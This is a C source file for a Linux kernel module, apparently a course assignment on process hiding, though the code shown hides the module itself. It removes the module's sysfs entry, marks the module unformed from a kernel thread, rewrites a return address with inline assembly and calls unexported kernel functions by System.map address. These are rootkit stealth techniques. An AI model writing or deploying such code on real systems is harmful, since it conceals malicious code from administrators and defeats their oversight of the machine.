/*
 *  Assignment 3
 *  Process Hiding
 *
 *  Requirements:
 *     a) Hide processes from the user in such a way that they are still scheduled.
 *     b) Tasks to hide should be identified by an array of PIDs passed to the
 *         module on the command line when loading the module
 */

#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/reboot.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/async.h>
#include <linux/pid_namespace.h>
#include <linux/ptrace.h>

#include <asm/paravirt.h>
#include <asm/cacheflush.h>

#include "sysmap.h"
#include "proc_internal.h"
#include "i_hate_static.c"

// dont look at this ;_;
noinline void skip_parent(void)
{
    void* dummy;
    void*** rbp;
    asm volatile ("jmp 1f             \n"
                  "2:                 \n"
                  "mov %rbp, %rsp     \n"
                  "pop %rbp           \n"
                  "ret                \n"
                  "1:                 \n");
    asm volatile ("movabsq $2b, %0" : "=r"(dummy));

    asm volatile ("movq %%rbp, %0" : "=r"(rbp));
    (*rbp)[1] = dummy;
}

static int postinit(void* data)
{
    ((struct module*)(THIS_MODULE))->state = MODULE_STATE_UNFORMED;
    ((typeof(&do_exit))SM_do_exit)(0);
    return 0;
}

int init_module(void){
    struct kobject* mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;

    printk(KERN_INFO "Module_hiding loaded.\n");
    kobject_del(mod_kobj);
    kthread_run(postinit, NULL, "hider");

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "Module_hiding unloaded.\n");

    skip_parent();

//        blocking_notifier_call_chain(&module_notify_list,
//                                     MODULE_STATE_GOING, mod);
        ((void (*)(void))SM_async_synchronize_full)();

        /* Store the name of the last unloaded module for diagnostic purposes */
//        strlcpy(last_unloaded_module, mod->name, sizeof(last_unloaded_module));

        free_module(((struct module* (*)(const char*))SM_find_module)("module_hiding"));

        asm volatile ("xorl %%eax, %%eax" ::: "eax");
//        return 0;
}

